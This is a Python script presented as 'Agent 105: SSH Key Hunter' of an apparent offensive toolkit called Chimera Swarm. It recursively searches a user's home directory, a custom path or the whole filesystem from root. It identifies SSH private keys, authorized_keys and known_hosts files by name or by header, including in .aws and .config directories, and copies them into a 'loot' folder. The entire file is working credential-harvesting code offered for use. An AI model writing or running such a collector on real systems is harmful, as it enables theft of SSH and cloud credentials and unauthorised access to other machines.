import os
import sys
import shutil
import time

class SSHKeyHunter:
    """
    Chimera Agent 105: SSH Key Hunter (Full Tactical Edition)
    Purpose: Recursive discovery and collection of SSH private keys and configs.
    """
    def __init__(self):
        # Establish Chimera directory structure
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        self.agent_root = os.path.dirname(self.script_dir)
        self.loot_dir = os.path.join(self.agent_root, "loot")
        
        if not os.path.exists(self.loot_dir):
            os.makedirs(self.loot_dir)

        self.targets = [
            ".ssh", "ssh", "backup", "old_keys", "config", "keys", ".aws", ".config"
        ]
        self.found_count = 0

    def is_private_key(self, filepath):
        """Checks the header of a file to see if it's an actual SSH private key."""
        try:
            with open(filepath, 'r', errors='ignore') as f:
                header = f.readline()
                if "BEGIN" in header and ("PRIVATE KEY" in header or "RSA" in header or "OPENSSH" in header):
                    return True
        except Exception:
            pass
        return False

    def loot_file(self, source_path):
        """Copies the identified key into the agent's loot directory with a timestamp."""
        filename = os.path.basename(source_path)
        timestamp = int(time.time())
        destination = os.path.join(self.loot_dir, f"{timestamp}_{filename}.loot")
        
        try:
            shutil.copy2(source_path, destination)
            print(f"[!!!] Agent 105: SECURED -> {filename}")
            self.found_count += 1
        except Exception as e:
            print(f"[!] Agent 105: Failed to loot {filename}: {e}")

    def hunt(self, search_path):
        """Recursively walks the filesystem looking for SSH-related artifacts."""
        print(f"[*] Agent 105: Commencing search in {search_path}...")
        
        for root, dirs, files in os.walk(search_path):
            # Optimization: only dive into 'interesting' sounding directories
            for file in files:
                filepath = os.path.join(root, file)
                
                # Logic A: Check by common filenames
                if any(x in file.lower() for x in ["id_rsa", "id_dsa", "id_ed25519", "authorized_keys", "known_hosts"]):
                    self.loot_file(filepath)
                
                # Logic B: Check by file content (the deep hunt)
                elif self.is_private_key(filepath):
                    self.loot_file(filepath)

    def menu(self):
        print("\n" + "="*60)
        print("   AGENT 105 :: SSH KEY HUNTER :: CHIMERA SWARM")
        print("="*60)
        print(f"Loot Directory: {self.loot_dir}")
        print("-" * 60)
        print("1. Quick Hunt (Current User Home)")
        print("2. Deep Hunt (Root / System Wide - REQUIRES SUDO)")
        print("3. Targeted Hunt (Custom Path)")
        print("0. Return to Commander")
        
        choice = input("\nSelect Strategy > ")
        
        if choice == "1":
            self.hunt(os.path.expanduser("~"))
        elif choice == "2":
            self.hunt("/")
        elif choice == "3":
            custom_path = input("Enter Path to Scour: ")
            self.hunt(custom_path)
        elif choice == "0":
            print("[*] Returning control to Commander.")
            sys.exit(0)
            
        print(f"\n[*] Mission Complete. Total Artifacts Recovered: {self.found_count}")

if __name__ == "__main__":
    hunter = SSHKeyHunter()
    hunter.menu()

